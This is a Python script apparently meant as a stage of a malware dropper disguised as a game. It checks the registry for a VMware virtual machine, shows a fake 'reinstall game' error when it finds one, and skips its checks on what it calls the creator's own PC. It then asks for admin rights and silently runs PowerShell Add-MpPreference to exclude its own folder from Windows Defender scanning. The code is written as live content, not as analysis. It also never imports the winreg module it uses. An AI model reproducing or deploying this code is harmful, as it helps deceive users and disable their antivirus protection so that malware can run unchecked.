import os
import platform
import subprocess
import ctypes
from tkinter import messagebox

def start():

	if os.name != 'nt':
		messagebox.showerror("Error", "Your os is not windows.")
		os._exit(0)

	if platform.node() == "DESKTOP-5JN6OBN":
		return "This is creator"
		#pass

	try:
		key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
		subkey_count = winreg.QueryInfoKey(key)[0]
		for i in range(subkey_count):
			subkey = winreg.EnumKey(key, i)
			if subkey.startswith('VMWARE'):
				messagebox.showerror("Error", "Cant find img/button.png. Try reinstalling game (or this error can be caused because of virtual machine).")
		winreg.CloseKey(key)
	except:
		pass

	try:
		is_admin = (os.getuid() == 0)
	except AttributeError:
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

	if not is_admin:
		messagebox.showerror("Error", "Launch script as admin.")
		return "script dont have admin rights"

	addCurrentFolder()
	return "all is fine"

def addCurrentFolder():
	current_location = os.path.dirname(os.path.abspath(__file__))
	print(current_location)
	command = f'powershell -Command Add-MpPreference -ExclusionPath "{current_location}"'

	process = subprocess.Popen(['powershell.exe', '-Command', command], shell=True, stdout=subprocess.PIPE,
							   stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
	output, error = process.communicate()

	if error != "":
		return "shit happened"

def addGoodFolder():
	pass

print(start())